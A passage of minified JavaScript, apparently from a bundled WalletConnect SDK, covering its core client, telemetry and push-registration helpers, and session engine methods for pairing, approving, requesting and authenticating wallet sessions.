AbortController,this.isDevEnv=ey(),this.init()}get storeKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//verify:public:key"}get context(){return gn(this.logger)}startAbortTimer(e){return this.abortController=new AbortController,setTimeout(()=>this.abortController.abort(),se.toMiliseconds(e))}}var f$=Object.defineProperty,p$=(t,e,r)=>e in t?f$(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Rv=(t,e,r)=>p$(t,typeof e!="symbol"?e+"":e,r);class g$ extends PT{constructor(e,r){super(e,r),this.projectId=e,this.logger=r,Rv(this,"context",m4),Rv(this,"registerDeviceToken",async n=>{const{clientId:i,token:s,notificationType:o,enableEncrypted:a=!1}=n,c=`${y4}/${this.projectId}/clients`;await fetch(c,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({client_id:i,type:o,token:s,always_raw:a})})}),this.logger=Gr(r,this.context)}}var m$=Object.defineProperty,Ov=Object.getOwnPropertySymbols,y$=Object.prototype.hasOwnProperty,w$=Object.prototype.propertyIsEnumerable,Xm=(t,e,r)=>e in t?m$(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,uu=(t,e)=>{for(var r in e||(e={}))y$.call(e,r)&&Xm(t,r,e[r]);if(Ov)for(var r of Ov(e))w$.call(e,r)&&Xm(t,r,e[r]);return t},gr=(t,e,r)=>Xm(t,typeof e!="symbol"?e+"":e,r);class b$ extends RT{constructor(e,r,n=!0){super(e,r,n),this.core=e,this.logger=r,gr(this,"context",b4),gr(this,"storagePrefix",Li),gr(this,"storageVersion",w4),gr(this,"events",new Map),gr(this,"shouldPersist",!1),gr(this,"init",async()=>{if(!ey())try{const i={eventId:bb(),timestamp:Date.now(),domain:this.getAppDomain(),props:{event:"INIT",type:"",properties:{client_id:await this.core.crypto.getClientId(),user_agent:G_(this.core.relayer.protocol,this.core.relayer.version,Wm)}}};await this.sendEvent([i])}catch(i){this.logger.warn(i)}}),gr(this,"createEvent",i=>{const{event:s="ERROR",type:o="",properties:{topic:a,trace:c}}=i,u=bb(),l=this.core.projectId||"",h=Date.now(),d=uu({eventId:u,timestamp:h,props:{event:s,type:o,properties:{topic:a,trace:c}},bundleId:l,domain:this.getAppDomain()},this.setMethods(u));return this.telemetryEnabled&&(this.events.set(u,d),this.shouldPersist=!0),d}),gr(this,"getEvent",i=>{const{eventId:s,topic:o}=i;if(s)return this.events.get(s);const a=Array.from(this.events.values()).find(c=>c.props.properties.topic===o);if(a)return uu(uu({},a),this.setMethods(a.eventId))}),gr(this,"deleteEvent",i=>{const{eventId:s}=i;this.events.delete(s),this.shouldPersist=!0}),gr(this,"setEventListeners",()=>{this.core.heartbeat.on(kc.pulse,async()=>{this.shouldPersist&&await this.persist(),this.events.forEach(i=>{se.fromMiliseconds(Date.now())-se.fromMiliseconds(i.timestamp)>v4&&(this.events.delete(i.eventId),this.shouldPersist=!0)})})}),gr(this,"setMethods",i=>({addTrace:s=>this.addTrace(i,s),setError:s=>this.setError(i,s)})),gr(this,"addTrace",(i,s)=>{const o=this.events.get(i);o&&(o.props.properties.trace.push(s),this.events.set(i,o),this.shouldPersist=!0)}),gr(this,"setError",(i,s)=>{const o=this.events.get(i);o&&(o.props.type=s,o.timestamp=Date.now(),this.events.set(i,o),this.shouldPersist=!0)}),gr(this,"persist",async()=>{await this.core.storage.setItem(this.storageKey,Array.from(this.events.values())),this.shouldPersist=!1}),gr(this,"restore",async()=>{try{const i=await this.core.storage.getItem(this.storageKey)||[];if(!i.length)return;i.forEach(s=>{this.events.set(s.eventId,uu(uu({},s),this.setMethods(s.eventId)))})}catch(i){this.logger.warn(i)}}),gr(this,"submit",async()=>{if(!this.telemetryEnabled||this.events.size===0)return;const i=[];for(const[s,o]of this.events)o.props.type&&i.push(o);if(i.length!==0)try{if((await this.sendEvent(i)).ok)for(const s of i)this.events.delete(s.eventId),this.shouldPersist=!0}catch(s){this.logger.warn(s)}}),gr(this,"sendEvent",async i=>{const s=this.getAppDomain()?"":"&sp=desktop";return await fetch(`${E4}?projectId=${this.core.projectId}&st=events_sdk&sv=js-${Wm}${s}`,{method:"POST",body:JSON.stringify(i)})}),gr(this,"getAppDomain",()=>W_().url),this.logger=Gr(r,this.context),this.telemetryEnabled=n,n?this.restore().then(async()=>{await this.submit(),this.setEventListeners()}):this.persist()}get storageKey(){return this.storagePrefix+this.storageVersion+this.core.customStoragePrefix+"//"+this.context}}var v$=Object.defineProperty,kv=Object.getOwnPropertySymbols,E$=Object.prototype.hasOwnProperty,A$=Object.prototype.propertyIsEnumerable,e0=(t,e,r)=>e in t?v$(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Dv=(t,e)=>{for(var r in e||(e={}))E$.call(e,r)&&e0(t,r,e[r]);if(kv)for(var r of kv(e))A$.call(e,r)&&e0(t,r,e[r]);return t},bt=(t,e,r)=>e0(t,typeof e!="symbol"?e+"":e,r);let _$=class JC extends wT{constructor(e){var r;super(e),bt(this,"protocol",BC),bt(this,"version",UC),bt(this,"name",Hm),bt(this,"relayUrl"),bt(this,"projectId"),bt(this,"customStoragePrefix"),bt(this,"events",new Vn.EventEmitter),bt(this,"logger"),bt(this,"heartbeat"),bt(this,"relayer"),bt(this,"crypto"),bt(this,"storage"),bt(this,"history"),bt(this,"expirer"),bt(this,"pairing"),bt(this,"verify"),bt(this,"echoClient"),bt(this,"linkModeSupportedApps"),bt(this,"eventClient"),bt(this,"initialized",!1),bt(this,"logChunkController"),bt(this,"on",(a,c)=>this.events.on(a,c)),bt(this,"once",(a,c)=>this.events.once(a,c)),bt(this,"off",(a,c)=>this.events.off(a,c)),bt(this,"removeListener",(a,c)=>this.events.removeListener(a,c)),bt(this,"dispatchEnvelope",({topic:a,message:c,sessionExists:u})=>{if(!a||!c)return;const l={topic:a,message:c,publishedAt:Date.now(),transportType:Wt.link_mode};this.relayer.onLinkMessageEvent(l,{sessionExists:u})});const n=this.getGlobalCore(e==null?void 0:e.customStoragePrefix);if(n)try{return this.customStoragePrefix=n.customStoragePrefix,this.logger=n.logger,this.heartbeat=n.heartbeat,this.crypto=n.crypto,this.history=n.history,this.expirer=n.expirer,this.storage=n.storage,this.relayer=n.relayer,this.pairing=n.pairing,this.verify=n.verify,this.echoClient=n.echoClient,this.linkModeSupportedApps=n.linkModeSupportedApps,this.eventClient=n.eventClient,this.initialized=n.initialized,this.logChunkController=n.logChunkController,n}catch(a){console.warn("Failed to copy global core",a)}this.projectId=e==null?void 0:e.projectId,this.relayUrl=(e==null?void 0:e.relayUrl)||LC,this.customStoragePrefix=e!=null&&e.customStoragePrefix?`:${e.customStoragePrefix}`:"";const i=Dc({level:typeof(e==null?void 0:e.logger)=="string"&&e.logger?e.logger:zM.logger,name:Hm}),{logger:s,chunkLoggerController:o}=G0({opts:i,maxSizeInBytes:e==null?void 0:e.maxLogBlobSizeInBytes,loggerOverride:e==null?void 0:e.logger});this.logChunkController=o,(r=this.logChunkController)!=null&&r.downloadLogsBlobInBrowser&&(window.downloadLogsBlobInBrowser=async()=>{var a,c;(a=this.logChunkController)!=null&&a.downloadLogsBlobInBrowser&&((c=this.logChunkController)==null||c.downloadLogsBlobInBrowser({clientId:await this.crypto.getClientId()}))}),this.logger=Gr(s,this.name),this.heartbeat=new yN,this.crypto=new YB(this,this.logger,e==null?void 0:e.keychain),this.history=new o$(this,this.logger),this.expirer=new u$(this,this.logger),this.storage=e!=null&&e.storage?e.storage:new XN(Dv(Dv({},HM),e==null?void 0:e.storageOptions)),this.relayer=new _U({core:this,logger:this.logger,relayUrl:this.relayUrl,projectId:this.projectId}),this.pairing=new n$(this,this.logger),this.verify=new d$(this,this.logger,this.storage),this.echoClient=new g$(this.projectId||"",this.logger),this.linkModeSupportedApps=[],this.eventClient=new b$(this,this.logger,e==null?void 0:e.telemetryEnabled),this.setGlobalCore(this)}static async init(e){const r=new JC(e);await r.initialize();const n=await r.crypto.getClientId();return await r.storage.setItem(n4,n),r}get context(){return gn(this.logger)}async start(){this.initialized||await this.initialize()}async getLogsBlob(){var e;return(e=this.logChunkController)==null?void 0:e.logsToBlob({clientId:await this.crypto.getClientId()})}async addLinkModeSupportedApp(e){this.linkModeSupportedApps.includes(e)||(this.linkModeSupportedApps.push(e),await this.storage.setItem(fv,this.linkModeSupportedApps))}async initialize(){this.logger.trace("Initialized");try{await this.crypto.init(),await this.history.init(),await this.expirer.init(),await this.relayer.init(),await this.heartbeat.init(),await this.pairing.init(),this.linkModeSupportedApps=await this.storage.getItem(fv)||[],this.initialized=!0,this.logger.info("Core Initialization Success")}catch(e){throw this.logger.warn(`Core Initialization Failure at epoch ${Date.now()}`,e),this.logger.error(e.message),e}}getGlobalCore(e=""){try{if(this.isGlobalCoreDisabled())return;const r=`_walletConnectCore_${e}`,n=`${r}_count`;return globalThis[n]=(globalThis[n]||0)+1,globalThis[n]>1&&console.warn(`WalletConnect Core is already initialized. This is probably a mistake and can lead to unexpected behavior. Init() was called ${globalThis[n]} times.`),globalThis[r]}catch(r){console.warn("Failed to get global WalletConnect core",r);return}}setGlobalCore(e){var r;try{if(this.isGlobalCoreDisabled())return;const n=`_walletConnectCore_${((r=e.opts)==null?void 0:r.customStoragePrefix)||""}`;globalThis[n]=e}catch(n){console.warn("Failed to set global WalletConnect core",n)}}isGlobalCoreDisabled(){try{return typeof process<"u"&&qM.DISABLE_GLOBAL_CORE==="true"}catch{return!0}}};const C$=_$,ZC="wc",XC=2,eI="client",hy=`${ZC}@${XC}:${eI}:`,lg={name:eI,logger:"error"},Mv="WALLETCONNECT_DEEPLINK_CHOICE",I$="proposal",Bv="Proposal expired",x$="session",Pa=se.SEVEN_DAYS,S$="engine",mr={wc_sessionPropose:{req:{ttl:se.FIVE_MINUTES,prompt:!0,tag:1100},res:{ttl:se.FIVE_MINUTES,prompt:!1,tag:1101},reject:{ttl:se.FIVE_MINUTES,prompt:!1,tag:1120},autoReject:{ttl:se.FIVE_MINUTES,prompt:!1,tag:1121}},wc_sessionSettle:{req:{ttl:se.FIVE_MINUTES,prompt:!1,tag:1102},res:{ttl:se.FIVE_MINUTES,prompt:!1,tag:1103}},wc_sessionUpdate:{req:{ttl:se.ONE_DAY,prompt:!1,tag:1104},res:{ttl:se.ONE_DAY,prompt:!1,tag:1105}},wc_sessionExtend:{req:{ttl:se.ONE_DAY,prompt:!1,tag:1106},res:{ttl:se.ONE_DAY,prompt:!1,tag:1107}},wc_sessionRequest:{req:{ttl:se.FIVE_MINUTES,prompt:!0,tag:1108},res:{ttl:se.FIVE_MINUTES,prompt:!1,tag:1109}},wc_sessionEvent:{req:{ttl:se.FIVE_MINUTES,prompt:!0,tag:1110},res:{ttl:se.FIVE_MINUTES,prompt:!1,tag:1111}},wc_sessionDelete:{req:{ttl:se.ONE_DAY,prompt:!1,tag:1112},res:{ttl:se.ONE_DAY,prompt:!1,tag:1113}},wc_sessionPing:{req:{ttl:se.ONE_DAY,prompt:!1,tag:1114},res:{ttl:se.ONE_DAY,prompt:!1,tag:1115}},wc_sessionAuthenticate:{req:{ttl:se.ONE_HOUR,prompt:!0,tag:1116},res:{ttl:se.ONE_HOUR,prompt:!1,tag:1117},reject:{ttl:se.FIVE_MINUTES,prompt:!1,tag:1118},autoReject:{ttl:se.FIVE_MINUTES,prompt:!1,tag:1119}}},hg={min:se.FIVE_MINUTES,max:se.SEVEN_DAYS},_i={idle:"IDLE",active:"ACTIVE"},Uv={eth_sendTransaction:{key:""},eth_sendRawTransaction:{key:""},wallet_sendCalls:{key:""},solana_signTransaction:{key:"signature"},solana_signAllTransactions:{key:"transactions"},solana_signAndSendTransaction:{key:"signature"}},N$="request",T$=["wc_sessionPropose","wc_sessionRequest","wc_authRequest","wc_sessionAuthenticate"],P$="wc",R$="auth",O$="authKeys",k$="pairingTopics",D$="requests",Uf=`${P$}@${1.5}:${R$}:`,ud=`${Uf}:PUB_KEY`;var M$=Object.defineProperty,B$=Object.defineProperties,U$=Object.getOwnPropertyDescriptors,$v=Object.getOwnPropertySymbols,$$=Object.prototype.hasOwnProperty,L$=Object.prototype.propertyIsEnumerable,t0=(t,e,r)=>e in t?M$(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,yt=(t,e)=>{for(var r in e||(e={}))$$.call(e,r)&&t0(t,r,e[r]);if($v)for(var r of $v(e))L$.call(e,r)&&t0(t,r,e[r]);return t},Qr=(t,e)=>B$(t,U$(e)),Q=(t,e,r)=>t0(t,typeof e!="symbol"?e+"":e,r);class F$ extends MT{constructor(e){super(e),Q(this,"name",S$),Q(this,"events",new H0),Q(this,"initialized",!1),Q(this,"requestQueue",{state:_i.idle,queue:[]}),Q(this,"sessionRequestQueue",{state:_i.idle,queue:[]}),Q(this,"requestQueueDelay",se.ONE_SECOND),Q(this,"expectedPairingMethodMap",new Map),Q(this,"recentlyDeletedMap",new Map),Q(this,"recentlyDeletedLimit",200),Q(this,"relayMessageCache",[]),Q(this,"pendingSessions",new Map),Q(this,"init",async()=>{this.initialized||(await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.registerPairingEvents(),await this.registerLinkModeListeners(),this.client.core.pairing.register({methods:Object.keys(mr)}),this.initialized=!0,setTimeout(async()=>{await this.processPendingMessageEvents(),this.sessionRequestQueue.queue=this.getPendingSessionRequests(),this.processSessionRequestQueue()},se.toMiliseconds(this.requestQueueDelay)))}),Q(this,"connect",async r=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();const n=Qr(yt({},r),{requiredNamespaces:r.requiredNamespaces||{},optionalNamespaces:r.optionalNamespaces||{}});await this.isValidConnect(n);const{pairingTopic:i,requiredNamespaces:s,optionalNamespaces:o,sessionProperties:a,scopedProperties:c,relays:u}=n;let l=i,h,d=!1;try{if(l){const C=this.client.core.pairing.pairings.get(l);this.client.logger.warn("connect() with existing pairing topic is deprecated and will be removed in the next major release."),d=C.active}}catch(C){throw this.client.logger.error(`connect() -> pairing.get(${l}) failed`),C}if(!l||!d){const{topic:C,uri:O}=await this.client.core.pairing.create();l=C,h=O}if(!l){const{message:C}=oe("NO_MATCHING_KEY",`connect() pairing topic: ${l}`);throw new Error(C)}const g=await this.client.core.crypto.generateKeyPair(),y=mr.wc_sessionPropose.req.ttl||se.FIVE_MINUTES,m=lr(y),b=Qr(yt(yt({requiredNamespaces:s,optionalNamespaces:o,relays:u??[{protocol:$C}],proposer:{publicKey:g,metadata:this.client.metadata},expiryTimestamp:m,pairingTopic:l},a&&{sessionProperties:a}),c&&{scopedProperties:c}),{id:Ni()}),A=it("session_connect",b.id),{reject:_,resolve:T,done:P}=To(y,Bv),S=({id:C})=>{C===b.id&&(this.client.events.off("proposal_expire",S),this.pendingSessions.delete(b.id),this.events.emit(A,{error:{message:Bv,code:0}}))};return this.client.events.on("proposal_expire",S),this.events.once(A,({error:C,session:O})=>{this.client.events.off("proposal_expire",S),C?_(C):O&&T(O)}),await this.sendRequest({topic:l,method:"wc_sessionPropose",params:b,throwOnFailedPublish:!0,clientRpcId:b.id}),await this.setProposal(b.id,b),{uri:h,approval:P}}),Q(this,"pair",async r=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{return await this.client.core.pairing.pair(r)}catch(n){throw this.client.logger.error("pair() failed"),n}}),Q(this,"approve",async r=>{var n,i,s;const o=this.client.core.eventClient.createEvent({properties:{topic:(n=r==null?void 0:r.id)==null?void 0:n.toString(),trace:[ti.session_approve_started]}});try{this.isInitialized(),await this.confirmOnlineStateOrThrow()}catch(D){throw o.setError(Io.no_internet_connection),D}try{await this.isValidProposalId(r==null?void 0:r.id)}catch(D){throw this.client.logger.error(`approve() -> proposal.get(${r==null?void 0:r.id}) failed`),o.setError(Io.proposal_not_found),D}try{await this.isValidApprove(r)}catch(D){throw this.client.logger.error("approve() -> isValidApprove() failed"),o.setError(Io.session_approve_namespace_validation_failure),D}const{id:a,relayProtocol:c,namespaces:u,sessionProperties:l,scopedProperties:h,sessionConfig:d}=r,g=this.client.proposal.get(a);this.client.core.eventClient.deleteEvent({eventId:o.eventId});const{pairingTopic:y,proposer:m,requiredNamespaces:b,optionalNamespaces:A}=g;let _=(i=this.client.core.eventClient)==null?void 0:i.getEvent({topic:y});_||(_=(s=this.client.core.eventClient)==null?void 0:s.createEvent({type:ti.session_approve_started,properties:{topic:y,trace:[ti.session_approve_started,ti.session_namespaces_validation_success]}}));const T=await this.client.core.crypto.generateKeyPair(),P=m.publicKey,S=await this.client.core.crypto.generateSharedKey(T,P),C=yt(yt(yt({relay:{protocol:c??"irn"},namespaces:u,controller:{publicKey:T,metadata:this.client.metadata},expiry:lr(Pa)},l&&{sessionProperties:l}),h&&{scopedProperties:h}),d&&{sessionConfig:d}),O=Wt.relay;_.addTrace(ti.subscribing_session_topic);try{await this.client.core.relayer.subscribe(S,{transportType:O})}catch(D){throw _.setError(Io.subscribe_session_topic_failure),D}_.addTrace(ti.subscribe_session_topic_success);const $=Qr(yt({},C),{topic:S,requiredNamespaces:b,optionalNamespaces:A,pairingTopic:y,acknowledged:!1,self:C.controller,peer:{publicKey:m.publicKey,metadata:m.metadata},controller:T,transportType:Wt.relay});await this.client.session.set(S,$),_.addTrace(ti.store_session);try{_.addTrace(ti.publishing_session_settle),await this.sendRequest({topic:S,method:"wc_sessionSettle",params:C,throwOnFailedPublish:!0}).catch(D=>{throw _==null||_.setError(Io.session_settle_publish_failure),D}),_.addTrace(ti.session_settle_publish_success),_.addTrace(ti.publishing_session_approve),await this.sendResult({id:a,topic:y,result:{relay:{protocol:c??"irn"},responderPublicKey:T},throwOnFailedPublish:!0}).catch(D=>{throw _==null||_.setError(Io.session_approve_publish_failure),D}),_.addTrace(ti.session_approve_publish_success)}catch(D){throw this.client.logger.error(D),this.client.session.delete(S,ht("USER_DISCONNECTED")),await this.client.core.relayer.unsubscribe(S),D}return this.client.core.eventClient.deleteEvent({eventId:_.eventId}),await this.client.core.pairing.updateMetadata({topic:y,metadata:m.metadata}),await this.client.proposal.delete(a,ht("USER_DISCONNECTED")),await this.client.core.pairing.activate({topic:y}),await this.setExpiry(S,lr(Pa)),{topic:S,acknowledged:()=>Promise.resolve(this.client.session.get(S))}}),Q(this,"reject",async r=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidReject(r)}catch(o){throw this.client.logger.error("reject() -> isValidReject() failed"),o}const{id:n,reason:i}=r;let s;try{s=this.client.proposal.get(n).pairingTopic}catch(o){throw this.client.logger.error(`reject() -> proposal.get(${n}) failed`),o}s&&(await this.sendError({id:n,topic:s,error:i,rpcOpts:mr.wc_sessionPropose.reject}),await this.client.proposal.delete(n,ht("USER_DISCONNECTED")))}),Q(this,"update",async r=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidUpdate(r)}catch(h){throw this.client.logger.error("update() -> isValidUpdate() failed"),h}const{topic:n,namespaces:i}=r,{done:s,resolve:o,reject:a}=To(),c=Ni(),u=$o().toString(),l=this.client.session.get(n).namespaces;return this.events.once(it("session_update",c),({error:h})=>{h?a(h):o()}),await this.client.session.update(n,{namespaces:i}),await this.sendRequest({topic:n,method:"wc_sessionUpdate",params:{namespaces:i},throwOnFailedPublish:!0,clientRpcId:c,relayRpcId:u}).catch(h=>{this.client.logger.error(h),this.client.session.update(n,{namespaces:l}),a(h)}),{acknowledged:s}}),Q(this,"extend",async r=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidExtend(r)}catch(c){throw this.client.logger.error("extend() -> isValidExtend() failed"),c}const{topic:n}=r,i=Ni(),{done:s,resolve:o,reject:a}=To();return this.events.once(it("session_extend",i),({error:c})=>{c?a(c):o()}),await this.setExpiry(n,lr(Pa)),this.sendRequest({topic:n,method:"wc_sessionExtend",params:{},clientRpcId:i,throwOnFailedPublish:!0}).catch(c=>{a(c)}),{acknowledged:s}}),Q(this,"request",async r=>{this.isInitialized();try{await this.isValidRequest(r)}catch(A){throw this.client.logger.error("request() -> isValidRequest() failed"),A}const{chainId:n,request:i,topic:s,expiry:o=mr.wc_sessionRequest.req.ttl}=r,a=this.client.session.get(s);(a==null?void 0:a.transportType)===Wt.relay&&await this.confirmOnlineStateOrThrow();const c=Ni(),u=$o().toString(),{done:l,resolve:h,reject:d}=To(o,"Request expired. Please try again.");this.events.once(it("session_request",c),({error:A,result:_})=>{A?d(A):h(_)});const g="wc_sessionRequest",y=this.getAppLinkIfEnabled(a.peer.metadata,a.transportType);if(y)return await this.sendRequest({clientRpcId:c,relayRpcId:u,topic:s,method:g,params:{request:Qr(yt({},i),{expiryTimestamp:lr(o)}),chainId:n},expiry:o,throwOnFailedPublish:!0,appLink:y}).catch(A=>d(A)),this.client.events.emit("session_request_sent",{topic:s,request:i,chainId:n,id:c}),await l();const m={request:Qr(yt({},i),{expiryTimestamp:lr(o)}),chainId:n},b=this.shouldSetTVF(g,m);return await Promise.all([new Promise(async A=>{await this.sendRequest(yt({clientRpcId:c,relayRpcId:u,topic:s,method:g,params:m,expiry:o,throwOnFailedPublish:!0},b&&{tvf:this.getTVFParams(c,m)})).catch(_=>d(_)),this.client.events.emit("session_request_sent",{topic:s,request:i,chainId:n,id:c}),A()}),new Promise(async A=>{var _;if(!((_=a.sessionConfig)!=null&&_.disableDeepLink)){const T=await jD(this.client.core.storage,Mv);await $D({id:c,topic:s,wcDeepLink:T})}A()}),l()]).then(A=>A[2])}),Q(this,"respond",async r=>{this.isInitialized(),await this.isValidRespond(r);const{topic:n,response:i}=r,{id:s}=i,o=this.client.session.get(n);o.transportType===Wt.relay&&await this.confirmOnlineStateOrThrow();const a=this.getAppLinkIfEnabled(o.peer.metadata,o.transportType);Ti(i)?await this.sendResult({id:s,topic:n,result:i.result,throwOnFailedPublish:!0,appLink:a}):zn(i)&&await this.sendError({id:s,topic:n,error:i.error,appLink:a}),this.cleanupAfterResponse(r)}),Q(this,"ping",async r=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidPing(r)}catch(i){throw this.client.logger.error("ping() -> isValidPing() failed"),i}const{topic:n}=r;if(this.client.session.keys.includes(n)){const i=Ni(),s=$o().toString(),{done:o,resolve:a,reject:c}=To();this.events.once(it("session_ping",i),({error:u})=>{u?c(u):a()}),await Promise.all([this.sendRequest({topic:n,method:"wc_sessionPing",params:{},throwOnFailedPublish:!0,clientRpcId:i,relayRpcId:s}),o()])}else this.client.core.pairing.pairings.keys.includes(n)&&(this.client.logger.warn("ping() on pairing topic is deprecated and will be removed in the next major release."),await this.client.core.pairing.ping({topic:n}))}),Q(this,"emit",async r=>{this.isInitialized(),await this.confirmOnlineStateOrThrow(),await this.isValidEmit(r);const{topic:n,event:i,chainId:s}=r,o=$o().toString(),a=Ni();await this.sendRequest({topic:n,method:"wc_sessionEvent",params:{event:i,chainId:s},throwOnFailedPublish:!0,relayRpcId:o,clientRpcId:a})}),Q(this,"disconnect",async r=>{this.isInitialized(),await this.confirmOnlineStateOrThrow(),await this.isValidDisconnect(r);const{topic:n}=r;if(this.client.session.keys.includes(n))await this.sendRequest({topic:n,method:"wc_sessionDelete",params:ht("USER_DISCONNECTED"),throwOnFailedPublish:!0}),await this.deleteSession({topic:n,emitEvent:!1});else if(this.client.core.pairing.pairings.keys.includes(n))await this.client.core.pairing.disconnect({topic:n});else{const{message:i}=oe("MISMATCHED_TOPIC",`Session or pairing topic not found: ${n}`);throw new Error(i)}}),Q(this,"find",r=>(this.isInitialized(),this.client.session.getAll().filter(n=>_8(n,r)))),Q(this,"getPendingSessionRequests",()=>this.client.pendingRequest.getAll()),Q(this,"authenticate",async(r,n)=>{var i;this.isInitialized(),this.isValidAuthenticate(r);const s=n&&this.client.core.linkModeSupportedApps.includes(n)&&((i=this.client.metadata.redirect)==null?void 0:i.linkMode),o=s?Wt.link_mode:Wt.relay;o===Wt.relay&&await this.confirmOnlineStateOrThrow();const{chains:a,statement:c="",uri:u,domain:l,nonce:h,type:d,exp:g,nbf:y,methods:m=[],expiry:b}=r,A=[...r.resources||[]],{topic:_,uri:T}=await this.client.core.pairing.create({methods:["wc_sessionAuthenticate"],transportType:o});this.client.logger.info({message:"Generated new pairing",pairing:{topic:_,uri:T}});const P=await this.client.core.crypto.generateKeyPair(),S=ad(P);if(await Promise.all([this.client.auth.authKeys.set(ud,{responseTopic:S,publicKey:P}),this.client.auth.pairingTopics.set(S,{topic:S,pairingTopic:_})]),await this.client.core.relayer.subscribe(S,{transportType:o}),this.client.logger.info(`sending request to new pairing topic: ${_}`),m.length>0){const{namespace:R}=ic(a[0]);let B=k5(R,"request",m);od(A)&&(B=M5(B,A.pop())),A.push(B)}const C=b&&b>mr.wc_sessionAuthenticate.req.ttl?b:mr.wc_sessionAuthenticate.req.ttl,O={authPayload:{type:d??"caip122",chains:a,statement:c,aud:u,domain:l,version:"1",nonce:h,iat:new Date().toISOString(),exp:g,nbf:y,resources:A},requester:{publicKey:P,metadata:this.client.metadata},expiryTimestamp:lr(C)},$={eip155:{chains:a,methods:[...new Set(["personal_sign",...m])],events:["chainChanged","accountsChanged"]}},D={requiredNamespaces:{},optionalNamespaces:$,relays:[{protocol:"irn"}],pairingTopic:_,proposer:{publicKey:P,metadata:this.client.metadata},expiryTimestamp:lr(mr.wc_sessionPropose.req.ttl),id:Ni()},{done:F,resolve:j,reject:L}=To(C,"Request expired"),N=Ni(),f=it("session_connect",D.id),p=it("session_request",N),w=async({error:R,session:B})=>{this.events.off(p,E),R?L(R):B&&j({session:B})},E=async R=>{var B,k,v;if(await this.deletePendingAuthRequest(N,{message:"fulfilled",code:0}),R.error){const K=ht("WC_METHOD_UNSUPPORTED","wc_sessionAuthenticate");return R.error.code===K.code?void 0:(this.events.off(f,w),L(R.error.message))}await this.deleteProposal(D.id),this.events.off(f,w);const{cacaos:M,responder:V}=R.result,I=[],z=[];for(const K of M){await Sb({cacao:K,projectId:this.client.core.projectId})||(this.client.logger.error(K,"Signature verification failed"),L(ht("SESSION_SETTLEMENT_FAILED","Signature verification failed")));const{p:ae}=K,ee=od(ae.resources),J=[Rm(ae.iss)],Te=kd(ae.iss);if(ee){const ie=Nb(ee),ye=Tb(ee);I.push(...ie),J.push(...ye)}for(const ie of J)z.push(`${ie}:${Te}`)}const G=await this.client.core.crypto.generateSharedKey(P,V.publicKey);let W;I.length>0&&(W={topic:G,acknowledged:!0,self:{publicKey:P,metadata:this.client.metadata},peer:V,controller:V.publicKey,expiry:lr(Pa),requiredNamespaces:{},optionalNamespaces:{},relay:{protocol:"irn"},pairingTopic:_,namespaces:Jb([...new Set(I)],[...new Set(z)]),transportType:o},await this.client.core.relayer.subscribe(G,{transportType:o}),await this.client.session.set(G,W),_&&await this.client.core.pairing.updateMetadata({topic:_,metadata:V.metadata}),W=this.client.session.get(G)),(B=this.client.metadata.redirect)!=null&&B.linkMode&&(k=V.metadata.redirect)!=null&&k.linkMode&&(v=V.metadata.redirect)!=null&&v.universal&&n&&(this.client.core.addLinkModeSupportedApp(V.metadata.redirect.universal),this.client.session.update(G,{transportType:Wt.link_mode})),j({auths:M,session:W})};this.events.once(f,w),this.events.once(p,E);let x;try{if(s){const R=Ks("wc_sessionAuthenticate",O,N);this.client.core.history.set(_,R);const B=await this.client.core.crypto.encode("",R,{type:nh,encoding:zs});x=Dh(n,_,B)}else await Promise.all([this.sendRequest({topic:_,method:"wc_sessionAuthenticate",params:O,expiry:r.expiry,throwOnFailedPublish:!0,clientRpcId:N}),this.sendRequest({topic:_,method:"wc_sessionPropose",params:D,expiry:mr.wc_sessionPropose.req.ttl,throwOnFailedPublish:!0,clientRpcId:D.id})])}catch(R){throw this.events.off(f,w),this.events.off(p,E),R}return await this.setProposal(D.id,D),await this.setAuthRequest(N,{request:Qr(yt({},O),{verifyContext:{}}),pairingTopic:_,transportType:o}),{uri:x??T,response:F}}),Q(this,"approveSessionAuthenticate",async r=>{const{id:n,auths:i}=r,s=this.client.core.eventClient.createEvent({properties:{topic:n.toString(),trace:[xo.authenticated_session_approve_started]}});try{this.isInitialized()}catch(b){throw s.setError(au.no_internet_connection),b}const o=this.getPendingAuthRequest(n);if(!o)throw s.setError(au.authenticated_session_pending_request_not_found),new Error(`Could not find pending auth request with id ${n}`);const a=o.transportType||Wt.relay;a===Wt.relay&&await this.confirmOnlineStateOrThrow();const c=o.requester.publicKey,u=await this.client.core.crypto.generateKeyPair(),l=ad(c),h={type:ps,receiverPublicKey:c,senderPublicKey:u},d=[],g=[];for(const b of i){if(!await Sb({cacao:b,projectId:this.client.core.projectId})){s.setError(au.invalid_cacao);const S=ht("SESSION_SETTLEMENT_FAILED","Signature verification failed");throw await this.sendError({id:n,topic:l,error:S,encodeOpts:h}),new Error(S.message)}s.addTrace(xo.cacaos_verified);const{p:A}=b,_=od(A.resources),T=[Rm(A.iss)],P=kd(A.iss);if(_){const S=Nb(_),C=Tb(_);d.push(...S),T.push(...C)}for(const S of T)g.push(`${S}:${P}`)}const y=await this.client.core.crypto.generateSharedKey(u,c);s.addTrace(xo.create_authenticated_session_topic);let m;if((d==null?void 0:d.length)>0){m={topic:y,acknowledged:!0,self:{publicKey:u,metadata:this.client.metadata},peer:{publicKey:c,metadata:o.requester.metadata},controller:c,expiry:lr(Pa),authentication:i,requiredNamespaces:{},optionalNamespaces:{},relay:{protocol:"irn"},pairingTopic:o.pairingTopic,namespaces:Jb([...new Set(d)],[...new Set(g)]),transportType:a},s.addTrace(xo.subscribing_authenticated_session_topic);try{await this.client.core.relayer.subscribe(y,{transportType:a})}catch(b){throw s.setError(au.subscribe_authenticated_session_topic_failure),b}s.addTrace(xo.subscribe_authenticated_session_topic_success),await this.client.session.set(y,m),s.addTrace(xo.store_authenticated_session),await 